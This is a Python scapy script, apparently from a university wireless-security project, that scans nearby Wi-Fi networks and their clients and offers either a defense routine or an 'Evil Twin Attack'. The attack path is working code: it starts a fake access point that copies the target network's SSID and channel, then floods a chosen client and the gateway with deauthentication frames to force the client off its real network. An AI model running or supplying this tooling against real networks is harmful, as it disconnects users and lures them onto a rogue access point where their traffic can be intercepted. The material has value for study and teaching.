
from itertools import count
from scapy.all import *
from threading import Thread
import pandas
import time
import os

import warnings

from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth

from defense import defense

warnings.filterwarnings('ignore')

# RUN EXAMPLE: sudo python3 WiFiScanner.py
# RUN EXAMPLE: sudo /bin/python3.8 /home/user/Documents/WiFiScanner.py
# (Should run with 'sudo')
# Sources can be found here: https://github.com/AlmogJakov/Protection-of-wireless-and-mobile-networks/blob/fc91a2ffe9c7dc98ee32072a3bc1d8fb9bb08943/WiFiScanner.py

stop_threads = False
# initialize the networks dataframe that will contain all access points nearby
cols = ['BSSID', 'SSID', 'dBm_Signal', 'Channel', 'Crypto']
networks = pandas.DataFrame(columns=cols, dtype=object)
user = {}


def callback(packet):
    frame = packet[Dot11]
    if packet.haslayer(Dot11Beacon):
        # Extract the MAC address of the network (address 2 = address mac of the transmitter)
        bssid = packet[Dot11].addr2
        if not networks.loc[networks["BSSID"].str.contains(bssid, case=False)].empty:
            return
        # Get the name of the network
        ssid = packet[Dot11Elt].info.decode()  # A Generic 802.11 Element
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # Extract network stats (Dot11Beacon class extend _Dot11EltUtils class which contains 'network_stats' method)
        stats = packet[Dot11Beacon].network_stats()
        # Get the channel of the AP
        channel = stats.get("channel")
        # Get the crypto (the type of network encryption)
        crypto = stats.get("crypto")
        # Add the network to the global list
        networks.loc[len(networks.index)] = (bssid, ssid, dbm_signal, channel, crypto)
    # if the FCfield is "ToDS"
    elif frame.FCfield & 0b1 != 0:
        if frame.addr1 not in user:
            user[frame.addr1] = set()
        user[frame.addr1].add(frame.addr2)


def change_channel():
    ch = 1

    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)
        if stop_threads:
            break


def for_ap(frame, interface):
    while True:
        sendp(frame, iface=interface, count=100, inter=0.1)


def enable_monitor_mode(inter):
    os.system(f'sudo ifconfig {inter} down')
    os.system(f'sudo iwconfig {inter} mode monitor')
    os.system(f'sudo ifconfig {inter} up')


def disable_monitor_mode(inter):
    os.system(f'sudo ifconfig {inter} down')
    os.system(f'sudo iwconfig {inter} mode managed')
    os.system(f'sudo ifconfig {inter} up')


def evil_twin():
    # 12. Fake AP
    fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
                  net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_internet + ' ' + interface_fake + ';"$SHELL'
    print(fake_ap_cmd)
    os.system(fake_ap_cmd)

    # 13. User attack
    # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
    print('The target is: ', target_mac)
    print('Attack!!! :)')
    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    frame2 = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()

    deauth1 = threading.Thread(target=for_ap, args=(frame1, interface))
    deauth2 = threading.Thread(target=for_ap, args=(frame2, interface))

    deauth1.start()
    deauth2.start()
    deauth1.join()
    deauth2.join()

    # 14. Disable monitor mode and cancel interface division
    disable_monitor_mode(interface)
    disable_monitor_mode(interface_fake)
    if flag_div:
        os.system("sudo iw dev mon0 interface del")


if __name__ == "__main__":
    print('1. Evil Twin Attack')
    print('2. Defense')
    val = input("Please Choose Action: ")
    while True:
        try:
            choose = int(val)
            if choose != 1 and choose != 2:
                raise Exception()
            break
        except:
            val = input("Please Choose Again: ")

    if choose == 1:
        action = 'Attack'
    else:
        action = 'Defense'

    if action == 'Attack':
    # 1. Get network interface card names & print
        interfaces = os.listdir('/sys/class/net/')
        print("Interfaces:")
        for (i, item) in enumerate(interfaces, start=1):
            print("   " + str(i) + ". " + item)
        val = input("Please Choose Interface for Dividing (Optional), otherwise enter -1: ")

    # 2. Choose card interface to split for 2 different interfaces
        flag_div = True
        while True:
            try:
                choose = int(val)
                if choose == -1:
                    flag_div = False
                    break
                interface = interfaces[choose - 1]
                enable_monitor_mode(interface)
                os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
                os.system(f"sudo iwconfig mon0 freq 2.484G")
                os.system(f"sudo ifconfig mon0 up")
                break
            except:
                val = input("Please Choose Again: ")

    interfaces = os.listdir('/sys/class/net/')
    print("Interfaces:")
    for (i, item) in enumerate(interfaces, start=1):
        print("   " + str(i) + ". " + item)
    val = input(f"Please Choose Interface for {action}: ")

    # 2.1 Choose card interface to attack/defense with
    while True:
        try:
            choose = int(val)
            interface = interfaces[choose - 1]
            break
        except:
            val = input("Please Choose Again: ")

    if action == 'Attack':

    # 2.2. Choose card interface to create Fake AP with
        val2 = input("Please Choose Interface for Fake AP: ")
        while True:
            try:
                if val2 == val:
                    raise Exception()
                choose = int(val2)
                interface_fake = interfaces[choose - 1]
                break
            except:
                val2 = input("Please Choose Again: ")

        val3 = input("Please Choose Interface for Internet Access of the Fake AP: ")

    # 2.3. Choose card interface to give internet access for the Fake AP
        while True:
            try:
                if val3 == val or val3 == val2:
                    raise Exception()
                choose = int(val3)
                interface_internet = interfaces[choose - 1]
                break
            except:
                val3 = input("Please Choose Again: ")

    # 3. Enable monitor mode
    enable_monitor_mode(interface)
    if action == 'Attack':
        enable_monitor_mode(interface_fake)

    print('Looking for networks.....')

    # 4. Start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # 5. Start sniffing (Synchronous process)
    sniff(prn=callback, iface=interface, timeout=10)

    # 6. Stop changing channel thread
    stop_threads = True

    # 7 Check if any networks found
    if networks.iloc[:, :]["BSSID"].empty:
        print("\nNo Networks Found! Aborting the process...")
        sys.exit(1)

    # 8. Choose the AP to attack/defense
    print(networks.iloc[:, [0, 1]])
    net_val = input(f"\nPlease enter the index of the AP you want to {action}: ")
    while True:
        try:
            net = networks.loc[int(net_val)]
        except:
            net_val = input("Please Choose Again Network: ")
            continue

        # 9. Print the Users
        i = 1
        gateway_mac = str(net[0])
        if gateway_mac in user:
            for n in user[gateway_mac]:
                print(str(i) + ' ' + n)
                i += 1
            break
        else:
            print('This network has no user:', gateway_mac)
            net_val = input("Please Choose Again Network: ")

    # 10. Choose the Client to attack/defense
    val = input(f"\nPlease enter the index of the client you want to {action}: ")
    while True:
        try:
            client_index = int(val)
            break
        except:
            val = input("Please Choose Again: ")

    # 11. Get the Client we choose
    i = 1
    target_mac = ''
    for client in user[gateway_mac]:
        if i == client_index:
            target_mac = client
            break
        i += 1

    if action == 'Attack':
        evil_twin()
    else:
        defense(interface, net, target_mac)